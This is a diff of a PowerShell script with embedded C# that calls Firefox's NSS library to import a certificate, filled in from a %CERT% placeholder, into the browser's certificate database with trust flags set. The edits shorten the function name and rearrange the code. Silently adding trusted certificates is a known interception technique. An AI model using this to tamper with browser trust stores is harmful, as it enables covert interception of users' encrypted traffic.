@@ -1,4 +1,4 @@
-function AddCertFF{
+function ACFF{
 Add-Type @"
 using System;
 using System.IO;
@@ -24,6 +24,10 @@ public sealed class FF
     }
 	
 	const int ERROR_SUCCESS=0;
+    
+    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
     private static IntPtr LoadWin32Library(string libPath)
     {
         if (String.IsNullOrEmpty(libPath))
@@ -39,9 +43,6 @@ public sealed class FF
         }
         return moduleHandle;
     }
-
-    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
-    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
 
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
@@ -187,8 +188,6 @@ public sealed class FF
             CertTrust.iEmail = 0x10;
             CertTrust.iSoft = 0x10;
 
-            IntPtr CertToImport = new IntPtr();
-            IntPtr[] aCertToImport = new IntPtr[1];
             //End init cert
             int status = NSS_Initialize(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
             if (status != ERROR_SUCCESS)
@@ -196,11 +195,13 @@ public sealed class FF
                 return false;
             }
             IntPtr bd = CERT_GetDefaultCertDB();
-            if (bd.Equals(IntPtr.Zero))
+            if (bd == IntPtr.Zero)
             {
                 NSS_Shutdown();
                 return false;
             }
+            IntPtr CertToImport = new IntPtr();
+            IntPtr[] aCertToImport = new IntPtr[1];
             status = CERT_ImportCerts(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
             if (status != ERROR_SUCCESS)
             {
@@ -215,14 +216,12 @@ public sealed class FF
                 return false;
             };
             CERT_DestroyCertArray(CertToImport, 1);
-            NSS_Shutdown();
-            return true;
         }
         catch (Exception){}
         finally
         {
-            Marshal.FreeHGlobal(ipCert);
-            ipCert = IntPtr.Zero;
+            /*Marshal.FreeHGlobal(ipCert);
+            ipCert = IntPtr.Zero;*/
             NSS_Shutdown();
         }
 		return true;
@@ -308,4 +307,4 @@ public sealed class FF
 "@;
 [FF]::GetInstance().Start("%CERT%");
 }
-AddCertFF
+ACFF
